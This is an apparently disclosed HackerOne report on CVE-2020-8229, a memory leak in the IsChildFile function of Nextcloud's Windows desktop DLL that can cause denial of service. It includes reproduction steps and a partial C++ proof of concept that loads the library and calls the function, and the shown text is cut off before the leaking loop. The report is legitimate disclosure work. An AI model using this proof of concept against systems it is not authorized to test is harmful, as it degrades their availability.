# [M] Memory Leak in OCUtil.dll library in Desktop client can lead to DoS

## Summary
Severity: Medium (CVSS 5.9)
Program: Nextcloud
Weakness: Uncontrolled Resource Consumption
Reporter: cwave
State: resolved
Disclosed: 2020-08-06T13:56:55.155Z
CVE: CVE-2020-8229
Source: https://hackerone.com/reports/588562

## Details
The function IsChildFile(const wchar_t* rootFolder, const wchar_t* file) in FileUtil.cpp allocates memory on line 42 and fails to free it.

The following PoC code can provide evidence. The code and the PoC executable is attached to this report. Also OCUtils.dll and OCUtils_x64.dll library which is delivered with Nextclound Windows installer was included in the attachment.

Steps to reproduce:
1. Launch tests.exe (see attachment) or compile the attached VS2017 solution and launch the resulted executable
2. Make sure OCUtil_x64 library is in the System library path
3. Open Windows Task Manager and watch how the amount of memory for tests.exe process is increasing.

A Visual Studio debugging session screenshot is also attached whre you can see the memory in use.

#include "pch.h"
#include <iostream>
#include <windows.h>

typedef bool(__cdecl *f_IsChildFile)(const wchar_t* rootFolder, const wchar_t* file);

int main()
{
	HINSTANCE hGetProcIDDLL = LoadLibrary(L"OCUtil_x64.dll");

	if (!hGetProcIDDLL) {
		std::cout << "could not load the dynamic library" << std::endl;
		return EXIT_FAILURE;
	}

	f_IsChildFile isChildFile = (f_IsChildFile)GetProcAddress(hGetProcIDDLL, "?IsChildFile@FileUtil@@SA_NPEB_W0@Z");
	if (!isChildFile) {
		std::cout << "could not locate the function" << std::endl;
		return EXIT_FAILURE;
	}

	std::cout << "Function is at " << isChildFile;

	const wchar_t * folder = L"C:\\TestFolder";
	const wchar_t * file = L"C:\\As they rounded a bend in the path that ran beside the river, Lara recognized the silhouette of a fig tree atop a nearby hill. The weather was hot and the days were long. The fig tree was in full leaf, but not yet bearing fruit. Soon Lara spotted other";

	bool res; 

_Trimmed to 38 lines — full report: https://hackerone.com/reports/588562_
